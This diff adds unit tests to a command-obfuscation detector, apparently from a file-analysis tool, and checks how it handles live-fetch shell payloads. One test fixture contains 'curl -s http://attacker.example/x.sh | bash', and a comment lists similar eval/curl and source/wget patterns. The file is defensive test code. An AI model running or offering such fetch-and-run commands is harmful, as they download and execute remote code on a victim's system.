@@ -333,3 +333,75 @@ test('cmd-obfuscation: shared whitelist constant covers both -replace and backti
   assert.ok(refs.length >= 2,
     `expected ≥2 .test() references to the shared constant; got ${refs.length}`);
 });
+
+// ── Detection-only sentinel (deobfuscated === raw) ──────────────────────────
+//
+// A candidate whose `deobfuscated` is byte-identical to its `raw` has
+// no peel to present — the pattern IS the payload (bash live-fetch
+// curl|sh, eval $(curl …), source <(wget …), etc.). Wrapping it in an
+// `encoded-content` finding produces a tautological "Deobfuscation"
+// card whose preview mirrors the input and whose "Load for analysis"
+// button replaces the input with an identical copy. The post-processor
+// short-circuits these into a `{ _detectionOnly: true, iocs, severity }`
+// sentinel; the host (`app-load.js`) routes the IOCs to
+// `findings.externalRefs` and drops the sentinel from
+// `findings.encodedContent`.
+
+test('cmd-obfuscation: _processCommandObfuscation returns _detectionOnly sentinel when deobfuscated === raw', async () => {
+  const candidate = {
+    type: 'cmd-obfuscation',
+    technique: 'Synthetic Detection-Only',
+    raw: 'curl -s http://attacker.example/x.sh | bash',
+    offset: 0,
+    length: 45,
+    deobfuscated: 'curl -s http://attacker.example/x.sh | bash',
+    _executeOutput: true,
+    _patternIocs: [{ url: 'synthetic T1105 mirror', severity: 'critical' }],
+  };
+  const result = await d._processCommandObfuscation(candidate);
+  assert.ok(result, 'expected sentinel result');
+  assert.equal(result._detectionOnly, true,
+    'expected _detectionOnly sentinel when deobfuscated === raw');
+  // No encoded-content fields leak through.
+  assert.equal(result.type, undefined,
+    'sentinel must NOT carry `type: encoded-content`');
+  assert.equal(result._deobfuscatedText, undefined,
+    'sentinel must NOT carry _deobfuscatedText (no tautological card)');
+  assert.equal(result.decodedBytes, undefined,
+    'sentinel must NOT carry decodedBytes');
+  assert.equal(result.canLoad, undefined,
+    'sentinel must NOT advertise canLoad (no drill-down)');
+  // Severity and IOCs survive onto the sentinel so the host can
+  // escalate risk via externalRefs.
+  assert.ok(Array.isArray(result.iocs) && result.iocs.length >= 1,
+    'sentinel must carry `iocs` for host-side externalRefs merge');
+  const mirror = result.iocs.find(i => i.type === IOC.PATTERN && /synthetic T1105/.test(i.url || ''));
+  assert.ok(mirror,
+    `expected _patternIocs mirror to flow through; got: ${JSON.stringify(host(result.iocs))}`);
+  assert.ok(result.severity === 'high' || result.severity === 'critical',
+    `expected severity ≥ high on _executeOutput + critical _patternIocs; got ${result.severity}`);
+});
+
+test('cmd-obfuscation: _processCommandObfuscation returns a normal encoded-content finding when deobfuscated differs from raw', async () => {
+  // Control for the above: a real peel (raw carets → cleaned
+  // powershell command) must still produce the `encoded-content`
+  // finding with `_deobfuscatedText` populated and `canLoad: true`.
+  const candidate = {
+    type: 'cmd-obfuscation',
+    technique: 'Synthetic Peel',
+    raw: 'p^o^w^e^r^s^h^e^l^l -Command "Get-Process"',
+    offset: 0,
+    length: 42,
+    deobfuscated: 'powershell -Command "Get-Process"',
+  };
+  const result = await d._processCommandObfuscation(candidate);
+  assert.ok(result, 'expected finding');
+  assert.equal(result._detectionOnly, undefined,
+    'normal candidate must NOT produce a _detectionOnly sentinel');
+  assert.equal(result.type, 'encoded-content',
+    'normal candidate must produce an encoded-content finding');
+  assert.equal(result._deobfuscatedText, candidate.deobfuscated,
+    '_deobfuscatedText must carry the actual peel');
+  assert.equal(result.canLoad, true,
+    'normal encoded-content findings advertise canLoad');
+});
